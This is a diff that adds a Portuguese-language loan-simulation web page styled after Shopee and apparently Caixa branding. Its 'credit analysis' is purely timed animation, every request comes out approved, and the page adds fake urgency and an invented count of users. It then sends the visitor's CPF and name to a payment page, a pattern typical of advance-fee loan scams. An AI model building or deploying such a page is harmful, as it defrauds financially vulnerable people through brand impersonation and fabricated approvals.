@@ -1,0 +1,918 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8">
+    <link rel="icon" href="images/five.png">
+
+    <script type="text/javascript">
+      (function (c, l, a, r, i, t, y) {
+        c[a] =
+          c[a] ||
+          function () {
+            (c[a].q = c[a].q || []).push(arguments);
+          };
+        t = l.createElement(r);
+        t.async = 1;
+        t.src = "https://www.clarity.ms/tag/" + i;
+        y = l.getElementsByTagName(r)[0];
+        y.parentNode.insertBefore(t, y);
+      })(window, document, "clarity", "script", "sgok0woyb3");
+    </script>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Simulação de Crédito</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="css/all.min.css" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            colors: {
+              shopee: {
+                light: "#ffdc00",
+                DEFAULT: "#1a5e9c",
+                dark: "#1a5e9c",
+                laranja: "#f7941c",
+              },
+            },
+          },
+        },
+      };
+    </script>
+    <style>
+      body {
+        font-family: "Poppins", sans-serif;
+        background-color: #f6f6f6;
+      }
+
+      /* >>> CORREÇÃO DO FUNDO AZUL DO INPUT <<< */
+      #creditValue {
+        background-color: #ffffff !important; /* fundo branco */
+        -webkit-appearance: none;
+        appearance: none;
+      }
+
+      #creditValue::placeholder {
+        color: #9ca3af; /* cinza suave no placeholder */
+      }
+
+      /* remove fundo azul/amarelo de autofill no iOS/Chrome */
+      #creditValue:-webkit-autofill {
+        -webkit-box-shadow: 0 0 0 1000px #ffffff inset;
+        -webkit-text-fill-color: #000000;
+      }
+      /* ------------------------------------------ */
+
+      .shopee-gradient {
+        background: linear-gradient(135deg, #f7941c 0%, #f7941c 100%);
+      }
+      .card {
+        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
+        border-radius: 16px;
+        transition: all 0.3s ease;
+      }
+      .btn-shine {
+        position: relative;
+        overflow: hidden;
+      }
+      .btn-shine:after {
+        content: "";
+        position: absolute;
+        top: -50%;
+        left: -50%;
+        width: 200%;
+        height: 200%;
+        background: linear-gradient(
+          to right,
+          rgba(255, 255, 255, 0) 0%,
+          rgba(255, 255, 255, 0.3) 50%,
+          rgba(255, 255, 255, 0) 100%
+        );
+        transform: rotate(30deg);
+        animation: shine 4s infinite;
+        -webkit-animation: shine 4s infinite;
+      }
+      @keyframes shine {
+        0% {
+          left: -100%;
+          opacity: 0;
+        }
+        10% {
+          left: 100%;
+          opacity: 0.6;
+        }
+        100% {
+          left: 100%;
+          opacity: 0;
+        }
+      }
+      @-webkit-keyframes shine {
+        0% {
+          left: -100%;
+          opacity: 0;
+        }
+        10% {
+          left: 100%;
+          opacity: 0.6;
+        }
+        100% {
+          left: 100%;
+          opacity: 0;
+        }
+      }
+      .floating {
+        animation: float 3s ease-in-out infinite;
+        -webkit-animation: float 3s ease-in-out infinite;
+      }
+      @keyframes float {
+        0% {
+          transform: translateY(0px);
+        }
+        50% {
+          transform: translateY(-10px);
+        }
+        100% {
+          transform: translateY(0px);
+        }
+      }
+      @-webkit-keyframes float {
+        0% {
+          -webkit-transform: translateY(0px);
+        }
+        50% {
+          -webkit-transform: translateY(-10px);
+        }
+        100% {
+          -webkit-transform: translateY(0px);
+        }
+      }
+      .icon-circle {
+        width: 44px;
+        height: 44px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border-radius: 50%;
+      }
+      .progress-bar {
+        height: 6px;
+        background-color: #f0f0f0;
+        border-radius: 10px;
+        overflow: hidden;
+        position: relative;
+      }
+      .progress-bar-fill {
+        position: absolute;
+        height: 100%;
+        background: linear-gradient(90deg, #f7941c 0%, #f7941c 100%);
+        border-radius: 10px;
+        width: 0%;
+      }
+
+      /* Animação da barra via CSS */
+      @keyframes progressFill {
+        0% { width: 0%; }
+        100% { width: 100%; }
+      }
+      @-webkit-keyframes progressFill {
+        0% { width: 0%; }
+        100% { width: 100%; }
+      }
+
+      .loading-dots span {
+        display: inline-block;
+        width: 8px;
+        height: 8px;
+        border-radius: 50%;
+        background-color: #1a5e9c;
+        margin: 0 2px;
+        opacity: 0.6;
+      }
+      .loading-dots span:nth-child(1) {
+        animation: pulse 1s infinite alternate;
+        -webkit-animation: pulse 1s infinite alternate;
+      }
+      .loading-dots span:nth-child(2) {
+        animation: pulse 1s 0.2s infinite alternate;
+        -webkit-animation: pulse 1s 0.2s infinite alternate;
+      }
+      .loading-dots span:nth-child(3) {
+        animation: pulse 1s 0.4s infinite alternate;
+        -webkit-animation: pulse 1s 0.4s infinite alternate;
+      }
+      @keyframes pulse {
+        0% {
+          transform: scale(1);
+          opacity: 0.6;
+        }
+        100% {
+          transform: scale(1.5);
+          opacity: 1;
+        }
+      }
+      @-webkit-keyframes pulse {
+        0% {
+          -webkit-transform: scale(1);
+          opacity: 0.6;
+        }
+        100% {
+          -webkit-transform: scale(1.5);
+          opacity: 1;
+        }
+      }
+      .check-circle {
+        width: 20px;
+        height: 20px;
+        background-color: #22c55e;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transform: scale(0);
+        -webkit-transform: scale(0);
+        transition: transform 0.3s ease;
+        -webkit-transition: -webkit-transform 0.3s ease;
+      }
+      .check-circle.active {
+        transform: scale(1);
+        -webkit-transform: scale(1);
+      }
+      .simulation-step {
+        display: none;
+        opacity: 0;
+        transform: translateY(20px);
+        -webkit-transform: translateY(20px);
+        transition: opacity 0.5s ease, transform 0.5s ease;
+        -webkit-transition: opacity 0.5s ease, -webkit-transform 0.5s ease;
+      }
+      .simulation-step.active {
+        display: block;
+        opacity: 1;
+        transform: translateY(0);
+        -webkit-transform: translateY(0);
+      }
+      .pulse {
+        animation: pulse-animation 2s infinite;
+        -webkit-animation: pulse-animation 2s infinite;
+      }
+      @keyframes pulse-animation {
+        0% {
+          box-shadow: 0 0 0 0 rgba(255, 221, 29, 0.4);
+        }
+        70% {
+          box-shadow: 0 0 0 15px rgba(238, 219, 45, 0);
+        }
+        100% {
+          box-shadow: 0 0 0 0 rgba(238, 219, 45, 0);
+        }
+      }
+      @-webkit-keyframes pulse-animation {
+        0% {
+          box-shadow: 0 0 0 0 rgba(255, 221, 29, 0.4);
+        }
+        70% {
+          box-shadow: 0 0 0 15px rgba(238, 219, 45, 0);
+        }
+        100% {
+          box-shadow: 0 0 0 0 rgba(238, 219, 45, 0);
+        }
+      }
+      .fade-in {
+        animation: fadeIn 0.5s ease-in-out forwards;
+        -webkit-animation: fadeIn 0.5s ease-in-out forwards;
+      }
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(10px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+      @-webkit-keyframes fadeIn {
+        from {
+          opacity: 0;
+          -webkit-transform: translateY(10px);
+        }
+        to {
+          opacity: 1;
+          -webkit-transform: translateY(0);
+        }
+      }
+      .page-transition {
+        transition: opacity 0.4s ease-in-out;
+      }
+      .fade-out {
+        opacity: 0.5;
+      }
+    </style>
+  </head>
+  <body>
+   
+<script>
+  window.pixelId = "692cedccf1d8644d9b7bb3bc";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+
+
+    <div class="max-w-md mx-auto min-h-screen bg-white">
+      <!-- Header -->
+      <div class="flex items-center p-4 border-b sticky top-0 bg-white z-10">
+        <a href="../index.html" class="text-shopee text-2xl mr-3"
+          ><i class="fas fa-arrow-left"></i
+        ></a>
+        <div class="flex items-center">
+          <img src="images/logocaixa2.png" alt="Shopee Logo" class="h-10" />
+          <span class="ml-2 text-xl font-bold text-shopee"></span>
+        </div>
+      </div>
+
+      <!-- Conteúdo da Simulação -->
+      <div class="flex flex-col p-6">
+        <!-- Etapa 1 -->
+        <div id="step1" class="simulation-step active">
+          <div class="mb-6">
+            <h1 class="text-2xl font-bold text-gray-800 mb-3">
+              Solicitar Empréstimo
+            </h1>
+            <p class="text-gray-600">
+              Olá, <span id="userName" class="font-medium"></span>! Configure
+              seu empréstimo de acordo com suas necessidades.
+            </p>
+          </div>
+
+          <div class="relative mb-6">
+            <h2 class="text-lg font-semibold text-gray-700 mb-4">
+              Insira o valor do empréstimo desejado
+            </h2>
+
+            <!-- INPUT CORRIGIDO -->
+            <div
+              class="border border-gray-300 rounded-xl overflow-hidden flex items-center bg-white focus-within:ring-2 focus-within:ring-shopee focus-within:border-transparent"
+            >
+              <div class="pl-4 pr-0 py-5 text-gray-500 text-3xl">R$</div>
+              <input
+                type="text"
+                id="creditValue"
+                placeholder="0,00"
+                class="flex-1 border-0 p-5 pl-2 focus:outline-none text-3xl font-bold text-gray-800 bg-white"
+              />
+            </div>
+            <p class="text-sm text-gray-500 mt-2">
+              Valor máximo: R$ 30.000,00
+            </p>
+          </div>
+
+          <div class="bg-white rounded-xl shadow-sm p-5 mb-6">
+            <h2 class="text-lg font-semibold text-gray-700 mb-4">
+              Selecione a duração do empréstimo
+            </h2>
+
+            <div class="grid grid-cols-2 gap-3 mb-3">
+              <button type="button" class="duration-btn border border-gray-300 rounded-xl py-4 hover:bg-gray-50 text-gray-800" data-months="3">
+                3 meses
+              </button>
+              <button type="button" class="duration-btn border border-gray-300 rounded-xl py-4 hover:bg-gray-50 text-gray-800" data-months="6">
+                6 meses
+              </button>
+            </div>
+
+            <div class="grid grid-cols-2 gap-3 mb-3">
+              <button type="button" class="duration-btn border border-gray-300 rounded-xl py-4 hover:bg-gray-50 text-gray-800" data-months="12">
+                12 meses
+              </button>
+              <button type="button" class="duration-btn border border-gray-300 rounded-xl py-4 hover:bg-gray-50 text-gray-800" data-months="24">
+                24 meses
+              </button>
+            </div>
+
+            <div class="grid grid-cols-2 gap-3">
+              <button type="button" class="duration-btn border border-gray-300 rounded-xl py-4 hover:bg-gray-50 text-gray-800" data-months="36">
+                36 meses
+              </button>
+              <button type="button" class="duration-btn border border-gray-300 rounded-xl py-4 hover:bg-gray-50 text-gray-800" data-months="48">
+                48 meses
+              </button>
+            </div>
+          </div>
+
+          <div id="resultPreview" class="bg-white rounded-xl shadow-sm p-5 mb-6 hidden">
+            <h2 class="text-lg font-semibold text-gray-700 mb-3">
+              Resumo do empréstimo
+            </h2>
+
+            <div class="flex justify-between items-center mb-3 pb-3 border-b border-gray-100">
+              <span class="text-gray-600">Valor solicitado:</span>
+              <span id="requestedAmount" class="text-gray-800 font-medium">R$ 0,00</span>
+            </div>
+
+            <div class="flex justify-between items-center mb-3 pb-3 border-b border-gray-100">
+              <span class="text-gray-600">Prazo:</span>
+              <span id="loanDuration" class="text-gray-800 font-medium">0 meses</span>
+            </div>
+
+            <div class="flex justify-between items-center mb-3 pb-3 border-b border-gray-100">
+              <span class="text-gray-600">Taxa de juros:</span>
+              <span class="text-gray-800 font-medium">0,81% ao mês</span>
+            </div>
+
+            <div class="flex justify-between items-center mb-3">
+              <span class="text-gray-600">Valor da parcela:</span>
+              <span id="installmentAmount" class="text-gray-800 font-bold">R$ 0,00</span>
+            </div>
+
+            <div class="flex justify-between items-center pt-3 border-t border-gray-200">
+              <span class="text-gray-700 font-medium">Total a pagar:</span>
+              <span id="totalAmount" class="text-shopee font-bold">R$ 0,00</span>
+            </div>
+          </div>
+
+          <button id="btnContinue" class="w-full bg-shopee-laranja hover:bg-shopee-laranja text-white text-lg font-bold py-4 rounded-xl btn-shine">
+            Continuar
+          </button>
+        </div>
+
+        <!-- Etapa 2: Processando -->
+        <div id="step2" class="simulation-step">
+          <div class="mb-8 text-center">
+            <h1 class="text-2xl font-bold text-gray-800 mb-3">
+              Analisando seu crédito
+            </h1>
+            <p class="text-gray-600">
+              Estamos verificando as melhores ofertas para você
+            </p>
+          </div>
+
+          <div class="flex justify-center mb-10">
+            <div class="w-24 h-24 rounded-full shopee-gradient flex items-center justify-center">
+              <div class="w-20 h-20 bg-white rounded-full flex items-center justify-center">
+                <i class="fas fa-chart-line text-shopee text-3xl"></i>
+              </div>
+            </div>
+          </div>
+
+          <div class="space-y-6 mb-8">
+            <div class="verification-item">
+              <div class="flex items-center justify-between mb-2">
+                <p class="text-gray-700">
+                  Verificando seu histórico de crédito...
+                </p>
+                <div id="check1" class="check-circle">
+                  <i class="fas fa-check text-white text-xs"></i>
+                </div>
+              </div>
+              <div class="progress-bar">
+                <div id="progress1" class="progress-bar-fill"></div>
+              </div>
+            </div>
+
+            <div class="verification-item">
+              <div class="flex items-center justify-between mb-2">
+                <p class="text-gray-700">Verificando suas compras...</p>
+                <div id="check2" class="check-circle">
+                  <i class="fas fa-check text-white text-xs"></i>
+                </div>
+              </div>
+              <div class="progress-bar">
+                <div id="progress2" class="progress-bar-fill"></div>
+              </div>
+            </div>
+
+            <div class="verification-item">
+              <div class="flex items-center justify-between mb-2">
+                <p class="text-gray-700">
+                  Verificando comportamento na plataforma...
+                </p>
+                <div id="check3" class="check-circle">
+                  <i class="fas fa-check text-white text-xs"></i>
+                </div>
+              </div>
+              <div class="progress-bar">
+                <div id="progress3" class="progress-bar-fill"></div>
+              </div>
+            </div>
+          </div>
+
+          <div class="text-center mt-8">
+            <div class="loading-dots">
+              <span></span>
+              <span></span>
+              <span></span>
+            </div>
+            <p class="text-sm text-gray-500 mt-2">
+              Por favor, aguarde enquanto finalizamos a análise...
+            </p>
+          </div>
+        </div>
+
+        <!-- Etapa 3: Resultado Final -->
+        <div id="step3" class="simulation-step">
+          <div class="mb-6">
+            <h1 class="text-2xl font-bold text-gray-800 mb-3">
+              Empréstimo Aprovado!
+            </h1>
+            <p class="text-gray-600">
+              Parabéns, <span id="userName2" class="font-medium">Cliente</span>!
+              Seu empréstimo foi aprovado.
+            </p>
+          </div>
+
+          <div class="mb-6">
+            <div class="bg-white rounded-xl shadow-sm p-5 mb-5">
+              <div class="flex flex-col items-center justify-center py-4">
+                <div class="text-4xl font-bold text-shopee mb-2" id="approvedValue">
+                  R$ 0,00
+                </div>
+                <p class="text-gray-600">Valor aprovado para você!</p>
+              </div>
+            </div>
+
+            <!-- Resumo do empréstimo aprovado -->
+            <div class="bg-white rounded-xl shadow-sm p-5 mb-6">
+              <h2 class="text-lg font-semibold text-gray-700 mb-3">
+                Resumo do seu empréstimo
+              </h2>
+
+              <div class="flex justify-between items-center mb-3 pb-3 border-b border-gray-100">
+                <span class="text-gray-600">Valor aprovado:</span>
+                <span id="finalApprovedAmount" class="text-gray-800 font-medium">R$ 0,00</span>
+              </div>
+
+              <div class="flex justify-between items-center mb-3 pb-3 border-b border-gray-100">
+                <span class="text-gray-600">Prazo:</span>
+                <span id="finalLoanDuration" class="text-gray-800 font-medium">0 meses</span>
+              </div>
+
+              <div class="flex justify-between items-center mb-3 pb-3 border-b border-gray-100">
+                <span class="text-gray-600">Taxa de juros:</span>
+                <span class="text-gray-800 font-medium">0,81% ao mês</span>
+              </div>
+
+              <div class="flex justify-between items-center mb-3">
+                <span class="text-gray-600">Valor da parcela:</span>
+                <span id="finalInstallmentAmount" class="text-gray-800 font-bold">R$ 0,00</span>
+              </div>
+
+              <div class="flex justify-between items-center pt-3 border-t border-gray-200">
+                <span class="text-gray-700 font-medium">Total a pagar:</span>
+                <span id="finalTotalAmount" class="text-shopee font-bold">R$ 0,00</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="bg-white rounded-xl shadow-sm p-5 mb-6">
+            <div class="flex items-center mb-4">
+              <div class="bg-green-100 icon-circle mr-3 flex-shrink-0">
+                <i class="fas fa-clock text-green-600"></i>
+              </div>
+              <div>
+                <h3 class="font-medium text-gray-800">
+                  Oferta válida apenas hoje!
+                </h3>
+                <p class="text-sm text-gray-600">
+                  Não perca esta oportunidade única.
+                </p>
+              </div>
+            </div>
+
+            <div class="text-center text-sm text-gray-500 mb-3">
+              <span class="text-green-600 font-medium">✓</span> Mais de 2.400
+              pessoas já ativaram hoje
+            </div>
+          </div>
+
+          <button id="btnRequest" class="w-full bg-shopee-laranja hover:bg-shopee-laranja text-white text-lg font-bold py-4 rounded-xl btn-shine pulse">
+            PROSSEGUIR COM A SOLICITAÇÃO
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        // --------- PARSE MANUAL DA QUERY (sem URLSearchParams) ---------
+        function parseQuery() {
+          var qs = window.location.search || "";
+          var obj = {};
+          if (qs.indexOf("?") === 0) {
+            qs = qs.substring(1);
+          }
+          if (!qs) return obj;
+          var parts = qs.split("&");
+          for (var i = 0; i < parts.length; i++) {
+            var pair = parts[i].split("=");
+            var key = decodeURIComponent(pair[0] || "");
+            var val = decodeURIComponent(pair[1] || "");
+            if (key) obj[key] = val;
+          }
+          return obj;
+        }
+
+        var queryParams = parseQuery();
+
+        // Elementos das etapas
+        var step1 = document.getElementById("step1");
+        var step2 = document.getElementById("step2");
+        var step3 = document.getElementById("step3");
+
+        // Botões
+        var btnContinue = document.getElementById("btnContinue");
+        var btnRequest = document.getElementById("btnRequest");
+
+        // Elementos de formulário
+        var creditValue = document.getElementById("creditValue");
+        var approvedValueEl = document.getElementById("approvedValue");
+
+        // Nome do usuário
+        var name = queryParams.nome || "Cliente";
+        var userNameEl = document.getElementById("userName");
+        if (userNameEl) {
+          userNameEl.textContent = name;
+        }
+
+        // Salvar nome no localStorage se veio na URL
+        if (queryParams.nome) {
+          try {
+            localStorage.setItem("nomeUsuario", queryParams.nome);
+          } catch (e) {}
+        }
+
+        // ------- Helpers de formatação BR (sem toLocaleString com options) -------
+        function formatNumberBR(value) {
+          var negative = value < 0;
+          value = Math.abs(value);
+          var fixed = value.toFixed(2); // "1234.56"
+          var parts = fixed.split(".");
+          var integer = parts[0];
+          var decimal = parts[1];
+          var withDots = integer.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+          return (negative ? "-" : "") + withDots + "," + decimal;
+        }
+
+        function formatCurrency(value) {
+          return "R$ " + formatNumberBR(value);
+        }
+
+        // Formatar valor de crédito enquanto digita e limitar a 30.000
+        creditValue.addEventListener("input", function (e) {
+          var onlyDigits = e.target.value.replace(/\D/g, "");
+
+          if (onlyDigits === "") {
+            e.target.value = "";
+            return;
+          }
+
+          var floatValue = parseFloat(onlyDigits) / 100;
+
+          if (floatValue > 30000) {
+            floatValue = 30000;
+          }
+
+          e.target.value = formatNumberBR(floatValue);
+
+          if (selectedDuration) {
+            updateLoanCalculation(floatValue, selectedDuration);
+          }
+        });
+
+        // Variável para armazenar a duração selecionada
+        var selectedDuration = null;
+
+        // Botões de duração (sem forEach)
+        var durationButtons = document.querySelectorAll(".duration-btn");
+        for (var i = 0; i < durationButtons.length; i++) {
+          durationButtons[i].addEventListener("click", function () {
+            // reset de todos
+            for (var j = 0; j < durationButtons.length; j++) {
+              durationButtons[j].classList.remove("bg-shopee", "border-shopee", "text-white");
+              durationButtons[j].classList.add(
+                "border-gray-300",
+                "text-gray-800",
+                "bg-white",
+                "hover:bg-gray-50"
+              );
+            }
+
+            // selecionado
+            this.classList.remove(
+              "border-gray-300",
+              "text-gray-800",
+              "bg-white",
+              "hover:bg-gray-50"
+            );
+            this.classList.add("bg-shopee", "border-shopee", "text-white");
+
+            selectedDuration = parseInt(this.getAttribute("data-months"), 10);
+
+            var raw = creditValue.value.replace(/\D/g, "");
+            var loanAmount = parseFloat(raw) / 100;
+            if (!isNaN(loanAmount)) {
+              updateLoanCalculation(loanAmount, selectedDuration);
+            }
+          });
+        }
+
+        // Função para calcular e atualizar o resumo do empréstimo
+        function updateLoanCalculation(amount, months) {
+          if (isNaN(amount) || amount <= 0 || !months) return;
+
+          var resultPreview = document.getElementById("resultPreview");
+          if (resultPreview) {
+            resultPreview.classList.remove("hidden");
+          }
+
+          var requestedAmountEl = document.getElementById("requestedAmount");
+          var loanDurationEl = document.getElementById("loanDuration");
+          var installmentAmountEl = document.getElementById("installmentAmount");
+          var totalAmountEl = document.getElementById("totalAmount");
+
+          if (requestedAmountEl) requestedAmountEl.textContent = formatCurrency(amount);
+          if (loanDurationEl) loanDurationEl.textContent = months + " meses";
+
+          var monthlyRate = 0.0081;
+          var pow = Math.pow(1 + monthlyRate, months);
+          var installmentValue =
+            (amount * (monthlyRate * pow)) / (pow - 1);
+          var totalAmount = installmentValue * months;
+
+          if (installmentAmountEl)
+            installmentAmountEl.textContent = formatCurrency(installmentValue);
+          if (totalAmountEl)
+            totalAmountEl.textContent = formatCurrency(totalAmount);
+        }
+
+        // Etapa 1 -> Etapa 2
+        btnContinue.addEventListener("click", function () {
+          if (!creditValue.value) {
+            alert("Por favor, digite um valor para simular.");
+            return;
+          }
+
+          if (!selectedDuration) {
+            alert("Por favor, selecione uma duração para o empréstimo.");
+            return;
+          }
+
+          var rawLoan = creditValue.value.replace(/\D/g, "");
+          var loanAmount = parseFloat(rawLoan) / 100;
+
+          var approvedValue = Math.max(loanAmount - 22, 0);
+
+          var monthlyRate = 0.0081;
+          var pow = Math.pow(1 + monthlyRate, selectedDuration);
+          var installmentValue =
+            (approvedValue * (monthlyRate * pow)) / (pow - 1);
+          var totalAmount = installmentValue * selectedDuration;
+
+          var formattedValue = formatNumberBR(approvedValue);
+
+          if (approvedValueEl) {
+            approvedValueEl.textContent = "R$ " + formattedValue;
+          }
+
+          try {
+            localStorage.setItem("creditoAprovado", formattedValue);
+            localStorage.setItem("creditoAprovadoValor", approvedValue);
+            localStorage.setItem("creditoDuracao", selectedDuration);
+            localStorage.setItem("creditoParcela", installmentValue.toFixed(2));
+            localStorage.setItem("creditoTotal", totalAmount.toFixed(2));
+            localStorage.setItem("creditoSolicitado", loanAmount.toFixed(2));
+          } catch (e) {}
+
+          var finalApprovedAmount = document.getElementById("finalApprovedAmount");
+          var finalLoanDuration = document.getElementById("finalLoanDuration");
+          var finalInstallmentAmount = document.getElementById("finalInstallmentAmount");
+          var finalTotalAmount = document.getElementById("finalTotalAmount");
+          var userName2 = document.getElementById("userName2");
+
+          if (finalApprovedAmount) finalApprovedAmount.textContent = formatCurrency(approvedValue);
+          if (finalLoanDuration) finalLoanDuration.textContent = selectedDuration + " meses";
+          if (finalInstallmentAmount) finalInstallmentAmount.textContent = formatCurrency(installmentValue);
+          if (finalTotalAmount) finalTotalAmount.textContent = formatCurrency(totalAmount);
+          if (userName2) userName2.textContent = name;
+
+          step1.classList.remove("active");
+          step2.classList.add("active");
+
+          runVerificationProcess();
+        });
+
+        // Etapa 3 -> Redirecionamento
+        btnRequest.addEventListener("click", function () {
+          var cpf = queryParams.cpf || "";
+          var nomeUsuario = queryParams.nome || "";
+
+          var currentQuery = window.location.search || "";
+          if (currentQuery.indexOf("?") === 0) {
+            currentQuery = currentQuery.substring(1);
+          }
+
+          var paramsArray = [];
+          if (currentQuery) {
+            paramsArray = currentQuery.split("&");
+          }
+
+          function upsertParam(key, value) {
+            var found = false;
+            for (var i = 0; i < paramsArray.length; i++) {
+              if (paramsArray[i].split("=")[0] === key) {
+                paramsArray[i] = key + "=" + encodeURIComponent(value);
+                found = true;
+                break;
+              }
+            }
+            if (!found) {
+              paramsArray.push(key + "=" + encodeURIComponent(value));
+            }
+          }
+
+          if (cpf) upsertParam("cpf", cpf);
+          if (nomeUsuario) upsertParam("nome", nomeUsuario);
+
+          var newQuery = paramsArray.join("&");
+          var newUrl = "/chat/pagamento/index.html";
+          if (newQuery) {
+            newUrl += "?" + newQuery;
+          }
+          window.location.href = newUrl;
+        });
+
+        // Simular processo de verificação (animação das barras)
+        function runVerificationProcess() {
+          var progress1 = document.getElementById("progress1");
+          var progress2 = document.getElementById("progress2");
+          var progress3 = document.getElementById("progress3");
+          var check1 = document.getElementById("check1");
+          var check2 = document.getElementById("check2");
+          var check3 = document.getElementById("check3");
+
+          setTimeout(function () {
+            animateProgress(progress1, 1500, function () {
+              if (check1) check1.classList.add("active");
+            });
+          }, 500);
+
+          setTimeout(function () {
+            animateProgress(progress2, 1800, function () {
+              if (check2) check2.classList.add("active");
+            });
+          }, 2000);
+
+          setTimeout(function () {
+            animateProgress(progress3, 2000, function () {
+              if (check3) check3.classList.add("active");
+
+              setTimeout(function () {
+                step2.classList.remove("active");
+                step3.classList.add("active");
+              }, 1000);
+            });
+          }, 4000);
+        }
+
+        // Animação da barra de progresso usando CSS animation
+        function animateProgress(element, duration, callback) {
+          if (!element) {
+            if (typeof callback === "function") callback();
+            return;
+          }
+
+          // reset
+          element.style.width = "0%";
+          element.style.animation = "none";
+          element.style.webkitAnimation = "none";
+
+          // Forçar reflow para reiniciar animação
+          void element.offsetHeight;
+
+          var seconds = duration / 1000;
+
+          element.style.animation = "progressFill " + seconds + "s linear forwards";
+          element.style.webkitAnimation = "progressFill " + seconds + "s linear forwards";
+
+          if (typeof callback === "function") {
+            setTimeout(callback, duration + 50);
+          }
+        }
+      });
+    </script>
+  
+
+</body></html>
